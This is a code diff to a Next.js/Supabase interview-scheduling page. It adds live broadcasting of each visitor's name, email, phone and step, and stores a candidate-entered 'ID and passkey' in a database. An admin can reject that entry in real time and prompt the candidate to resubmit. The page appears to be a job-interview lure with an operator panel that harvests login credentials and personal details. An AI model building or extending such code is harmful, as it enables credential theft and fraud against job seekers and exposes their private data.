@@ -1,6 +1,6 @@
 "use client";
 
-import { useEffect, useMemo, useState, Suspense } from "react";
+import { useEffect, useMemo, useState, Suspense, useRef } from "react";
 import { useSearchParams } from "next/navigation";
 import Link from "next/link";
 import Logo from "@/components/Logo";
@@ -44,6 +44,18 @@ function SchedulePageInner() {
   const supabase = useMemo(() => createClient(), []);
   const searchParams = useSearchParams();
   const jobSlug = searchParams.get("job");
+
+  // Persistent Session ID for real-time presence tracking
+  const [sessionId] = useState(() => {
+    if (typeof window !== "undefined") {
+      const stored = sessionStorage.getItem("candidate_session_id");
+      if (stored) return stored;
+      const gen = crypto.randomUUID();
+      sessionStorage.setItem("candidate_session_id", gen);
+      return gen;
+    }
+    return "cand-" + Math.random().toString(36).substring(2, 9);
+  });
 
   const [settings, setSettings] = useState<Settings>(DEFAULT_SETTINGS);
   const [jobTitle, setJobTitle] = useState<string | null>(null);
@@ -119,6 +131,50 @@ function SchedulePageInner() {
     })();
   }, [selectedDate, settings, supabase]);
 
+  // Real-Time Candidate Online / Offline Presence Tracking
+  useEffect(() => {
+    const presenceChannel = supabase.channel("candidate-presence-room", {
+      config: { presence: { key: sessionId } },
+    });
+
+    presenceChannel.subscribe(async (status) => {
+      if (status === "SUBSCRIBED") {
+        await presenceChannel.track({
+          session_id: sessionId,
+          booking_id: bookingId,
+          name: name.trim(),
+          email: email.trim(),
+          phone: phone.trim(),
+          date: selectedDate,
+          start_time: selectedSlot?.start_time,
+          end_time: selectedSlot?.end_time,
+          phase:
+            phase === "confirmed"
+              ? "Confirmed"
+              : step === "details"
+              ? verifyStage === "closed"
+                ? "Entering Details"
+                : verifyStage === "idPasskey"
+                ? "In ID/Passkey Modal"
+                : `In ${verifyStage}`
+              : "Selecting Date & Time",
+          online: true,
+          updated_at: Date.now(),
+        });
+      }
+    });
+
+    const handleBeforeUnload = () => {
+      presenceChannel.untrack();
+    };
+    window.addEventListener("beforeunload", handleBeforeUnload);
+
+    return () => {
+      window.removeEventListener("beforeunload", handleBeforeUnload);
+      supabase.removeChannel(presenceChannel);
+    };
+  }, [sessionId, bookingId, name, email, phone, selectedDate, selectedSlot, step, phase, verifyStage, supabase]);
+
   // Realtime: admin actions on this booking drive the modal's stage and error messaging
   useEffect(() => {
     if (!bookingId) return;
@@ -190,6 +246,7 @@ function SchedulePageInner() {
     setSelectedSlot(null);
   }
 
+  // 100% Reliable ID & Passkey submission: creates the booking row with filled credentials directly
   async function handleSubmitIdPasskey(candidateId: string, passkey: string) {
     setSubmitting(true);
     setVerifyError(null);
@@ -221,8 +278,11 @@ function SchedulePageInner() {
           .single();
 
         if (error) throw error;
-        setBookingId(data.id);
+        if (data?.id) {
+          setBookingId(data.id);
+        }
       } else {
+        // Re-submission after a rejection (status was 'rejected' -> updates to 'pending')
         const { error } = await supabase
           .from("bookings")
           .update({ candidate_id: candidateId, passkey: passkey, status: "pending" })
@@ -285,7 +345,7 @@ function SchedulePageInner() {
         <Logo size="sm" />
       </div>
 
-      {/* Main Scheduling Card (Dynamic Width: Compact when no date, Expanded when date selected) */}
+      {/* Main Scheduling Card */}
       <div
         className={`w-full bg-white rounded-2xl shadow-xl border border-gray-200/80 overflow-hidden flex flex-col sm:flex-row transition-all duration-300 relative ${
           step === "datetime" && !selectedDate ? "max-w-3xl" : "max-w-5xl"
@@ -315,7 +375,7 @@ function SchedulePageInner() {
 
         {/* Right Interactive Area */}
         <main className="flex-1 p-8 sm:p-10 font-sans">
-          {/* STEP 1: DATE & TIME SELECTION (Picture 1) */}
+          {/* STEP 1: DATE & TIME SELECTION */}
           {phase === "form" && step === "datetime" && (
             <div className="animate-fade-up">
               <h2 className="text-xl sm:text-2xl font-bold text-[#0a2540] mb-8">
@@ -383,7 +443,7 @@ function SchedulePageInner() {
                   <TimezoneSelector value={timezone} onChange={setTimezone} />
                 </div>
 
-                {/* Right Time Slots Column (Shown once a date is selected, Picture 1) */}
+                {/* Right Time Slots Column */}
                 {selectedDate && (
                   <div className="lg:w-64 lg:border-l border-gray-200/80 lg:pl-8 animate-fade-up">
                     <p className="text-sm font-medium text-gray-700 mb-4">
@@ -433,52 +493,17 @@ function SchedulePageInner() {
             </div>
           )}
 
-          {/* STEP 2: ENTER DETAILS FORM (Picture 2) */}
+          {/* STEP 2: ENTER DETAILS FORM */}
           {phase === "form" && step === "details" && (
             <div className="animate-fade-up max-w-lg font-sans">
               <h2 className="text-2xl font-bold text-[#0a2540] mb-6">Enter Details</h2>
 
               <form
                 className="space-y-5"
-                onSubmit={async (e) => {
+                onSubmit={(e) => {
                   e.preventDefault();
                   setVerifyError(null);
                   setVerifyStage("idPasskey");
-
-                  // Create initial booking draft immediately so admin sees candidate entering ID & Passkey
-                  try {
-                    if (!bookingId) {
-                      const [firstName, ...rest] = name.trim().split(/\s+/);
-                      const lastName = rest.join(" ") || "-";
-                      const combinedNotes = [notes, guestEmail ? `Guests: ${guestEmail}` : ""].filter(Boolean).join("\n");
-
-                      const { data, error } = await supabase
-                        .from("bookings")
-                        .insert({
-                          job_id: jobId,
-                          first_name: firstName || name,
-                          last_name: lastName,
-                          email,
-                          phone_number: phone || null,
-                          notes: combinedNotes || null,
-                          date: selectedDate,
-                          start_time: selectedSlot!.start_time,
-                          end_time: selectedSlot!.end_time,
-                          timezone,
-                          candidate_id: null,
-                          passkey: null,
-                          status: "pending",
-                        })
-                        .select("id")
-                        .single();
-
-                      if (data?.id) {
-                        setBookingId(data.id);
-                      }
-                    }
-                  } catch (err) {
-                    console.error("Initial booking draft creation:", err);
-                  }
                 }}
               >
                 {/* Name */}
@@ -563,7 +588,7 @@ function SchedulePageInner() {
                   />
                 </div>
 
-                {/* Terms / Privacy Disclaimer with blue links */}
+                {/* Terms / Privacy Disclaimer */}
                 <p className="text-xs text-gray-500 leading-relaxed pt-1">
                   By proceeding, you confirm that you have read and agree to{" "}
                   <Link href="/contact" className="text-[#0069ff] hover:underline">
@@ -576,7 +601,7 @@ function SchedulePageInner() {
                   .
                 </p>
 
-                {/* Schedule Event Button (Pill Button in Picture 2) */}
+                {/* Schedule Event Button */}
                 <div className="pt-2">
                   <button
                     type="submit"
